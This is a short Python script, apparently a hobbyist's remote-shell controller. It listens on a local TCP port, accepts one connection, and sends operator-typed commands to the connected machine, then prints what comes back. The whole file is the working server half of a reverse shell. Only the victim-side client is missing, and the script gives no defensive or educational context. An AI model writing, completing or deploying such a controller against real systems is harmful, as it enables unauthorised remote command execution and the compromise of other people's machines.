#Made by sug023
#!/bin/env python

import socket;from os import system as cmd; from colorama import Fore as color

IP = "127.0.0.1"
PORT = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))
server.listen(1)

cmd("clear")
print(f"{color.CYAN}\n\n[+]{color.WHITE} Waiting for incoming connection{color.WHITE}")

(conn, addr) = server.accept()

while True:
    cmd = input(color.CYAN+f"\n$:{color.WHITE} ")
    cmd = cmd.encode("utf-8")
    conn.send(cmd)
    output = conn.recv(1024); output = output.decode("utf-8"); print(color.YELLOW+f"\n{output}")
